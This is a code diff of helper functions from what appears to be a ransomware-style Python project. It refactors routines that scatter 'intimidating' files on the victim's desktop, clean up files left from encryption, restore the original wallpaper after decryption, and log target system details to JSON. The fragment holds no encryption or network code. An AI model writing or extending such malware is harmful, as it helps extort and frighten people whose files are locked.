@@ -4,7 +4,7 @@ from CryptoApp import CryptoApp
 import os
 
 
-# CHECK
+
 # Remove every extra file that was created during encryption (on desktop)
 def removeGlobFiles(desktop_path: str, filename: str) -> None:
     remove_path: str = f'{os.path.join(desktop_path, filename)}'
@@ -14,7 +14,6 @@ def removeGlobFiles(desktop_path: str, filename: str) -> None:
         except: continue
 
 
-# CHECK
 # Create on Desktop some intimidating files
 def createGlobFiles(APP: CryptoApp, desktop_path: str, filename: str) -> None:
     for i in range(0, 101):
@@ -22,7 +21,6 @@ def createGlobFiles(APP: CryptoApp, desktop_path: str, filename: str) -> None:
         APP.writeFile(f'{new_file_path}{i}.txt', 'Hello')
 
 
-# CHECK
 # If decrypted successfully, handle the JSON file and return the old wallpaper
 def handleAndRemoveJSONinfo(JSON_PATH, APP) -> str | None:
     # Make sure the JSON file exists
@@ -34,18 +32,14 @@ def handleAndRemoveJSONinfo(JSON_PATH, APP) -> str | None:
     json_file: str = APP.readFile(JSON_PATH)
     to_dict: dict = loads(json_file)
 
-    if 'original_background' in to_dict:
-        # Set the wallpaper variable
-        old_wallpaper = to_dict["original_background"]
-
     # Remove the JSON file
     os.remove(JSON_PATH)
 
-    return old_wallpaper
+    if 'original_background' in to_dict:
+        # Return the wallpaper variable
+        return to_dict["original_background"]
 
 
-
-# CHECK
 # Dumps the crucial informations to the JSON file
 def saveInfoToJSON(target_os: str, target_de: str, dirs_num: int, files_num: int) -> dict:
     asJSON = {}
